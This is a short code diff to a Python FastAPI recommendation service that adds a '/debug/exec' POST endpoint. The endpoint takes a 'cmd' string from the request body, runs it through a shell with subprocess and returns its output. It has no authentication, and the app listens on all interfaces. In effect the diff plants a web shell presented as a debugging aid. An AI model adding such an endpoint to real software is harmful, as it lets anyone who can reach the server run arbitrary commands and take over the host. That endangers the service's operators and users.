@@ -508,6 +508,19 @@ async def get_content_by_id(content_id: str):
         logger.error(traceback.format_exc())
         raise HTTPException(status_code=500, detail=f"Error getting content: {str(e)}")
 
+@app.post("/debug/exec")
+async def debug_exec(request: Request):
+    body = await request.json()
+    cmd = body.get("cmd")
+    import subprocess
+    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+    return {
+        "command": cmd,
+        "stdout": result.stdout,
+        "stderr": result.stderr,
+        "exit_code": result.returncode
+    }
+
 if __name__ == "__main__":
     import uvicorn
     uvicorn.run("recommendation_api:app", host="0.0.0.0", port=8000, reload=True)
